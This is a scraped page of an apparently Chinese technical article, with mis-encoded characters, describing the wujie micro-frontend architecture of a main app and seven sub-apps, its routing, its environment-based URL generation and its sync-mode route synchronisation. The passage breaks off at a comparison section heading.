                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    13
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»10åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p><strong>ç‰ˆæœ¬</strong>: v2.0ï¼ˆsync æ¨¡å¼é‡æ„ï¼‰<br/>
<strong>æ—¥æœŸ</strong>: 2026-02-09<br/>
<strong>æ¡†æ¶</strong>: wujieï¼ˆæ— ç•Œï¼‰â€” alive + sync æ¨¡å¼<br/>
<strong>é€‚ç”¨èŒƒå›´</strong>: CMCLink å¾®å‰ç«¯ä¸»åº”ç”¨ + 7 ä¸ªå­åº”ç”¨</p>
</blockquote>
<hr/>
<h2 data-id="heading-0">ä¸€ã€æ¶æ„æ€»è§ˆ</h2>
<h3 data-id="heading-1">1.1 ç³»ç»Ÿæ‹“æ‰‘</h3>
<pre><code class="hljs language-java" lang="java">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                    CMCLink å¾®å‰ç«¯æ¶æ„                             â”‚
â”‚                                                                 â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
â”‚  â”‚              ä¸»åº”ç”¨ <span class="hljs-meta">@cmclink</span>/main (:<span class="hljs-number">3000</span>)                  â”‚  â”‚
â”‚  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚  â”‚
â”‚  â”‚  â”‚ Router  â”‚  â”‚ AuthLayout   â”‚  â”‚     App.vue         â”‚  â”‚  â”‚
â”‚  â”‚  â”‚ (Vue)   â”‚  â”‚ (Header/Tab) â”‚  â”‚ (WujieVue å®¹å™¨)     â”‚  â”‚  â”‚
â”‚  â”‚  â””â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚  â”‚
â”‚  â”‚       â”‚              â”‚                      â”‚             â”‚  â”‚
â”‚  â”‚       â”‚     wujie <span class="hljs-title function_">bus</span> <span class="hljs-params">(EventEmitter)</span>        â”‚             â”‚  â”‚
â”‚  â”‚       â”‚    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”           â”‚             â”‚  â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
â”‚          â”‚    â”‚                    â”‚           â”‚                 â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
â”‚  â”‚                    å­åº”ç”¨æ²™ç®±å±‚ (wujie)                      â”‚  â”‚
â”‚  â”‚                                                           â”‚  â”‚
â”‚  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚  â”‚
â”‚  â”‚  â”‚  doc    â”‚ â”‚  mkt    â”‚ â”‚ common  â”‚ â”‚ ibs-manage   â”‚   â”‚  â”‚
â”‚  â”‚  â”‚ :<span class="hljs-number">3003</span>   â”‚ â”‚ :<span class="hljs-number">3001</span>   â”‚ â”‚ :<span class="hljs-number">3006</span>   â”‚ â”‚    :<span class="hljs-number">3007</span>     â”‚   â”‚  â”‚
â”‚  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚  â”‚
â”‚  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”                    â”‚  â”‚
â”‚  â”‚  â”‚commerce â”‚ â”‚operationâ”‚ â”‚ general â”‚                    â”‚  â”‚
â”‚  â”‚  â”‚-finance â”‚ â”‚ :<span class="hljs-number">3004</span>   â”‚ â”‚ :<span class="hljs-number">3005</span>   â”‚                    â”‚  â”‚
â”‚  â”‚  â”‚ :<span class="hljs-number">3002</span>   â”‚ â”‚         â”‚ â”‚         â”‚                    â”‚  â”‚
â”‚  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                    â”‚  â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
â”‚                                                                 â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
â”‚  â”‚              å…±äº«åŒ… <span class="hljs-meta">@cmclink</span>/micro-bridge                   â”‚  â”‚
â”‚  â”‚  registry.ts â”‚ url.ts â”‚ types.ts â”‚ bridges                â”‚  â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<h3 data-id="heading-2">1.2 å­åº”ç”¨æ³¨å†Œè¡¨</h3>
<p>æ‰€æœ‰å­åº”ç”¨åœ¨ <code>packages/micro-bridge/src/registry.ts</code> ä¸­ç»Ÿä¸€æ³¨å†Œï¼š</p>





























































<table><thead><tr><th>å­åº”ç”¨åç§°</th><th>ç«¯å£</th><th>activeRule</th><th>entry</th><th>çŠ¶æ€</th></tr></thead><tbody><tr><td>mkt</td><td>3001</td><td><code>/mkt</code></td><td><code>/mkt/</code></td><td>å¾…è¿ç§»</td></tr><tr><td>commerce-finance</td><td>3002</td><td><code>/commerce-finance</code></td><td><code>/commerce-finance/</code></td><td>å¾…è¿ç§»</td></tr><tr><td>doc</td><td>3003</td><td><code>/doc</code></td><td><code>/doc/</code></td><td>âœ… å·²è¿ç§»</td></tr><tr><td>operation</td><td>3004</td><td><code>/operation</code></td><td><code>/operation/</code></td><td>å¾…è¿ç§»</td></tr><tr><td>general</td><td>3005</td><td><code>/general</code></td><td><code>/general/</code></td><td>å¾…è¿ç§»</td></tr><tr><td>common</td><td>3006</td><td><code>/common</code></td><td><code>/common/</code></td><td>å¾…è¿ç§»</td></tr><tr><td>ibs-manage</td><td>3007</td><td><code>/ibs-manage</code></td><td><code>/ibs-manage/</code></td><td>âœ… å·²è¿ç§»</td></tr></tbody></table>
<h3 data-id="heading-3">1.3 Monorepo é¡¹ç›®ç»“æ„</h3>
<pre><code class="hljs language-ruby" lang="ruby">å¾®å‰ç«¯/
â”œâ”€â”€ apps/
â”‚   â”œâ”€â”€ cmclink-web-micro-main/   <span class="hljs-comment"># ä¸»åº”ç”¨ <span class="hljs-doctag">@cmclink</span>/main</span>
â”‚   â”œâ”€â”€ doc/                       <span class="hljs-comment"># å­åº”ç”¨ <span class="hljs-doctag">@cmclink</span>/doc</span>
â”‚   â””â”€â”€ ibs-manage/                <span class="hljs-comment"># å­åº”ç”¨ <span class="hljs-doctag">@cmclink</span>/ibs-manage</span>
â”œâ”€â”€ packages/
â”‚   â”œâ”€â”€ micro-bridge/              <span class="hljs-comment"># å¾®å‰ç«¯é€šä¿¡ SDK</span>
â”‚   â”œâ”€â”€ micro-bootstrap/           <span class="hljs-comment"># å­åº”ç”¨å¯åŠ¨å™¨</span>
â”‚   â”œâ”€â”€ tsconfig/                  <span class="hljs-comment"># å…±äº« TS é…ç½®</span>
â”‚   â””â”€â”€ vite-config/               <span class="hljs-comment"># å…±äº« Vite é…ç½®</span>
â”œâ”€â”€ pnpm-workspace.yaml
â””â”€â”€ turbo.json
</code></pre>
<hr/>
<h2 data-id="heading-4">äºŒã€è·¯ç”±è®¾è®¡æ–¹æ¡ˆ</h2>
<h3 data-id="heading-5">2.1 URL è®¾è®¡åŸåˆ™</h3>
<p><strong>æ ¸å¿ƒåŸåˆ™ï¼šURL å¯¹ç”¨æˆ·æ— æ„Ÿï¼Œå­åº”ç”¨è·¯å¾„ç›´æ¥æ‹¼æ¥åœ¨ä¸»åº”ç”¨è·¯å¾„åã€‚</strong></p>
<pre><code class="hljs language-javascript" lang="javascript">ä¸»åº”ç”¨ <span class="hljs-attr">base</span>:  <span class="hljs-regexp">/micro-main/</span>
å­åº”ç”¨è·¯ç”±:   <span class="hljs-regexp">/micro-main/</span>{appName}/{å­åº”ç”¨å†…éƒ¨è·¯å¾„}

ç¤ºä¾‹:
  <span class="hljs-regexp">/micro-main/</span>                                          â†’ ä¸»åº”ç”¨é¦–é¡µ
  /micro-main/ibs-manage/operation/enterpriseMgmt       â†’ ibs-manage å­åº”ç”¨
  /micro-main/doc/<span class="hljs-variable language_">document</span>/blManage                     â†’ doc å­åº”ç”¨
  /micro-main/profile                                   â†’ ä¸»åº”ç”¨ä¸ªäººä¸­å¿ƒ
</code></pre>
<h3 data-id="heading-6">2.2 ä¸»åº”ç”¨è·¯ç”±é…ç½®</h3>
<p>ä¸»åº”ç”¨ Vue Router é‡‡ç”¨ <code>createWebHistory(VITE_BASE_PATH)</code> æ¨¡å¼ï¼Œè·¯ç”±åˆ†ä¸ºä¸‰å±‚ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">è·¯ç”±æ ‘:
â”œâ”€â”€ /login                          <span class="hljs-comment"># å…¬å¼€è·¯ç”±ï¼ˆæ— éœ€ç™»å½•ï¼‰</span>
â”œâ”€â”€ /forget-password                <span class="hljs-comment"># å…¬å¼€è·¯ç”±</span>
â”œâ”€â”€ /resetPwd                       <span class="hljs-comment"># å…¬å¼€è·¯ç”±</span>
â”œâ”€â”€ /                               <span class="hljs-comment"># AuthenticatedLayoutï¼ˆéœ€ç™»å½•ï¼‰</span>
â”‚   â”œâ”€â”€ /                           <span class="hljs-comment"># ä¸»åº”ç”¨é¦–é¡µ</span>
â”‚   â”œâ”€â”€ /profile                    <span class="hljs-comment"># ä¸ªäººä¸­å¿ƒ</span>
â”‚   â”œâ”€â”€ /message-center             <span class="hljs-comment"># æ¶ˆæ¯ä¸­å¿ƒ</span>
â”‚   â”œâ”€â”€ /mkt/:pathMatch(.*)*        <span class="hljs-comment"># å­åº”ç”¨å ä½è·¯ç”±ï¼ˆrender nullï¼‰</span>
â”‚   â”œâ”€â”€ /commerce-finance/:pathMatch(.*)*
â”‚   â”œâ”€â”€ /doc/:pathMatch(.*)*
â”‚   â”œâ”€â”€ /ibs-manage/:pathMatch(.*)*
â”‚   â”œâ”€â”€ /common/:pathMatch(.*)*
â”‚   â”œâ”€â”€ /operation/:pathMatch(.*)*
â”‚   â””â”€â”€ /general/:pathMatch(.*)*
â””â”€â”€ /:pathMatch(.*)*                <span class="hljs-comment"># 404 å…œåº•</span>
</code></pre>
<p><strong>å…³é”®è®¾è®¡ç‚¹</strong>ï¼š</p>
<ul>
<li>å­åº”ç”¨è·¯ç”±ä½¿ç”¨ <code>/:pathMatch(.*)*</code> é€šé…ç¬¦ï¼Œç¡®ä¿ <code>/ibs-manage/operation/xxx</code> ç­‰æ·±å±‚è·¯å¾„éƒ½èƒ½åŒ¹é…</li>
<li>å­åº”ç”¨è·¯ç”±çš„ <code>component</code> è®¾ä¸º <code>{ render: () =&gt; null }</code>ï¼Œä¸æ¸²æŸ“ä»»ä½•ä¸»åº”ç”¨ç»„ä»¶</li>
<li>å­åº”ç”¨è·¯ç”±çš„ <code>meta.appName</code> æ ‡è¯†æ‰€å±å­åº”ç”¨ï¼Œç”¨äº Tab ç®¡ç†</li>
<li>æ‰€æœ‰å­åº”ç”¨è·¯ç”±éƒ½æ˜¯ <code>AuthenticatedLayout</code> çš„ childrenï¼Œç¡®ä¿ Header/Tab å§‹ç»ˆæ˜¾ç¤º</li>
</ul>
<h3 data-id="heading-7">2.3 ä¸»åº”ç”¨æ˜¾éšæ§åˆ¶</h3>
<p><code>App.vue</code> å’Œ <code>AuthenticatedLayout.vue</code> ååŒæ§åˆ¶ä¸»åº”ç”¨å†…å®¹ä¸å­åº”ç”¨å®¹å™¨çš„æ˜¾éšï¼š</p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">App.vue:</span>
â”œâ”€â”€ &lt;RouterView&gt;                    <span class="hljs-comment"># å§‹ç»ˆæ¸²æŸ“ï¼ˆAuthenticatedLayout è¢« keep-alive ç¼“å­˜ï¼‰</span>
â”‚   â””â”€â”€ &lt;AuthenticatedLayout&gt;
â”‚       â”œâ”€â”€ &lt;LayoutHeader&gt;          <span class="hljs-comment"># å§‹ç»ˆæ˜¾ç¤º</span>
â”‚       â”œâ”€â”€ &lt;SiderMenu&gt;             <span class="hljs-comment"># å§‹ç»ˆæ˜¾ç¤º</span>
â”‚       â””â”€â”€ &lt;main-app-content&gt;      <span class="hljs-comment"># v-show="!findAppByRoute(route.path)"</span>
â”‚           â””â”€â”€ &lt;RouterView&gt;        <span class="hljs-comment"># ä¸»åº”ç”¨é¡µé¢</span>
â”‚
â””â”€â”€ &lt;child-app-container&gt;           <span class="hljs-comment"># v-if="userStore.isSetUser &amp;&amp; isChildRoute"</span>
    â””â”€â”€ &lt;WujieVue v-for&gt;            <span class="hljs-comment"># v-show="route.path.startsWith(app.activeRule)"</span>
        â”œâ”€â”€ doc
        â”œâ”€â”€ ibs-manage
        â””â”€â”€ ...
</code></pre>
<p><strong>æ˜¾éšåˆ¤æ–­é€»è¾‘</strong>ï¼š</p>



































<table><thead><tr><th>åœºæ™¯</th><th><code>main-app-content</code></th><th><code>child-app-container</code></th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>/</code> (é¦–é¡µ)</td><td>âœ… æ˜¾ç¤º</td><td>âŒ éšè—</td><td><code>findAppByRoute</code> è¿”å› undefined</td></tr><tr><td><code>/profile</code></td><td>âœ… æ˜¾ç¤º</td><td>âŒ éšè—</td><td>ä¸»åº”ç”¨é¡µé¢</td></tr><tr><td><code>/ibs-manage/xxx</code></td><td>âŒ éšè—</td><td>âœ… æ˜¾ç¤º</td><td>å­åº”ç”¨è·¯ç”±ï¼Œå‰ç¼€åŒ¹é…</td></tr><tr><td><code>/doc/xxx</code></td><td>âŒ éšè—</td><td>âœ… æ˜¾ç¤º</td><td>å­åº”ç”¨è·¯ç”±</td></tr></tbody></table>
<h3 data-id="heading-8">2.4 å­åº”ç”¨ URL ç”Ÿæˆ</h3>
<p>å¼€å‘ç¯å¢ƒå’Œç”Ÿäº§ç¯å¢ƒä½¿ç”¨ä¸åŒçš„ URL ç”Ÿæˆç­–ç•¥ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// packages/micro-bridge/src/url.ts</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">getAppUrl</span>(<span class="hljs-params">app: MicroAppConfig, envGetter</span>): <span class="hljs-built_in">string</span> {
  <span class="hljs-comment">// ç¯å¢ƒå˜é‡ key: VITE_${APP_NAME}_APP_URL</span>
  <span class="hljs-comment">// ä¾‹å¦‚: VITE_IBS_MANAGE_APP_URL=http://localhost:3007</span>
  <span class="hljs-keyword">const</span> envKey = <span class="hljs-string">`VITE_<span class="hljs-subst">${app.name.toUpperCase().replace(/-/g, <span class="hljs-string">'_'</span>)}</span>_APP_URL`</span>
  <span class="hljs-keyword">const</span> envUrl = <span class="hljs-title function_">envGetter</span>(envKey)

  <span class="hljs-keyword">if</span> (envUrl) {
    <span class="hljs-comment">// å¼€å‘ç¯å¢ƒ: http://localhost:3007 + /ibs-manage/ = http://localhost:3007/ibs-manage/</span>
    <span class="hljs-keyword">return</span> <span class="hljs-string">`<span class="hljs-subst">${envUrl}</span><span class="hljs-subst">${app.entry}</span>`</span>
  }
  <span class="hljs-comment">// ç”Ÿäº§ç¯å¢ƒ: ç›´æ¥ä½¿ç”¨ entryï¼ˆç›¸å¯¹è·¯å¾„ï¼Œç”± nginx åå‘ä»£ç†ï¼‰</span>
  <span class="hljs-keyword">return</span> app.<span class="hljs-property">entry</span>
}
</code></pre>
<p><strong>ç¯å¢ƒå˜é‡é…ç½®</strong>ï¼ˆ<code>.env.base</code>ï¼‰ï¼š</p>
<pre><code class="hljs language-env" lang="env">VITE_MKT_APP_URL=http://localhost:3001
VITE_COMMERCE_FINANCE_APP_URL=http://localhost:3002
VITE_DOC_APP_URL=http://localhost:3003
VITE_OPERATION_APP_URL=http://localhost:3004
VITE_GENERAL_APP_URL=http://localhost:3005
VITE_COMMON_APP_URL=http://localhost:3006
VITE_IBS_MANAGE_APP_URL=http://localhost:3007
</code></pre>
<hr/>
<h2 data-id="heading-9">ä¸‰ã€è·¯ç”±åŒæ­¥æœºåˆ¶</h2>
<h3 data-id="heading-10">3.1 wujie sync æ¨¡å¼</h3>
<p>é‡‡ç”¨ wujie å®˜æ–¹æ¨èçš„ <strong>sync æ¨¡å¼</strong>ï¼Œç”±æ¡†æ¶è‡ªåŠ¨å®Œæˆä¸»åº”ç”¨ä¸å­åº”ç”¨ä¹‹é—´çš„è·¯ç”±åŒæ­¥ï¼Œ<strong>æ— éœ€æ‰‹åŠ¨ bus é€šä¿¡ã€æ— éœ€é˜²å¾ªç¯æ ‡è®°</strong>ã€‚</p>
<pre><code class="hljs language-vue" lang="vue">&lt;!-- App.vue --&gt;
&lt;WujieVue
  :name="app.name"
  :url="getAppUrl(app)"
  :alive="true"
  :sync="true"    â† å¯ç”¨ sync æ¨¡å¼
/&gt;
</code></pre>
<p><strong>sync æ¨¡å¼åŸç†</strong>ï¼š</p>
<ul>
<li>wujie å†…éƒ¨åŠ«æŒå­åº”ç”¨çš„ <code>history.pushState</code> / <code>history.replaceState</code></li>
<li>å­åº”ç”¨è·¯ç”±å˜åŒ–æ—¶ï¼Œwujie è‡ªåŠ¨å°†å­åº”ç”¨è·¯å¾„åŒæ­¥åˆ°ä¸»åº”ç”¨ URL</li>
<li>ä¸»åº”ç”¨ URL å˜åŒ–æ—¶ï¼Œwujie è‡ªåŠ¨é©±åŠ¨å­åº”ç”¨è·¯ç”±è·³è½¬</li>
<li>æ•´ä¸ªè¿‡ç¨‹ç”±æ¡†æ¶å†…éƒ¨å¤„ç†ï¼Œ<strong>æ— å¾ªç¯é£é™©</strong></li>
</ul>
<h3 data-id="heading-11">3.2 æ•°æ®æµè®¾è®¡</h3>
<p><strong>è®¾è®¡åŸåˆ™ï¼šè·¯ç”±åŒæ­¥å®Œå…¨å§”æ‰˜ç»™ wujie sync æ¨¡å¼ï¼Œä¸šåŠ¡å±‚åªè´Ÿè´£ <code>router.push</code>ã€‚</strong></p>
<pre><code class="hljs language-bash" lang="bash">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                     è·¯ç”±åŒæ­¥æ•°æ®æµ                             â”‚
â”‚                                                             â”‚
â”‚  åœºæ™¯ A: èœå•/Tab ç‚¹å‡»                                       â”‚
â”‚  â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€                                     â”‚
â”‚  menuClick / tabClick                                       â”‚
â”‚    â””â”€â”€ router.push(<span class="hljs-string">'/ibs-manage/operation/xxx'</span>)             â”‚
â”‚         â”‚                                                   â”‚
â”‚         â–¼                                                   â”‚
â”‚  ä¸»åº”ç”¨ URL å˜åŒ– â†’ wujie <span class="hljs-built_in">sync</span> è‡ªåŠ¨é©±åŠ¨å­åº”ç”¨è·¯ç”±è·³è½¬           â”‚
â”‚    â””â”€â”€ å­åº”ç”¨ router è‡ªåŠ¨è·³è½¬åˆ° /operation/xxx               â”‚
â”‚                                                             â”‚
â”‚  âœ… æ— éœ€ bus é€šä¿¡ï¼Œæ— å¾ªç¯é£é™©                                  â”‚
â”‚                                                             â”‚
â”‚                                                             â”‚
â”‚  åœºæ™¯ B: å­åº”ç”¨å†…éƒ¨å¯¼èˆª                                       â”‚
â”‚  â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€                                     â”‚
â”‚  å­åº”ç”¨å†…éƒ¨ç‚¹å‡»é“¾æ¥ â†’ router.push(<span class="hljs-string">'/operation/yyy'</span>)           â”‚
â”‚         â”‚                                                   â”‚
â”‚         â–¼                                                   â”‚
â”‚  wujie <span class="hljs-built_in">sync</span> è‡ªåŠ¨åŒæ­¥åˆ°ä¸»åº”ç”¨ URL                              â”‚
â”‚    â””â”€â”€ ä¸»åº”ç”¨åœ°å€æ æ›´æ–°ä¸º /ibs-manage/operation/yyy           â”‚
â”‚                                                             â”‚
â”‚  âœ… æ— éœ€ bus é€šä¿¡ï¼Œæ— å¾ªç¯é£é™©                                  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<h3 data-id="heading-12">3.3 ä¸æ‰‹åŠ¨æ–¹æ¡ˆå¯¹æ¯”</h3>



































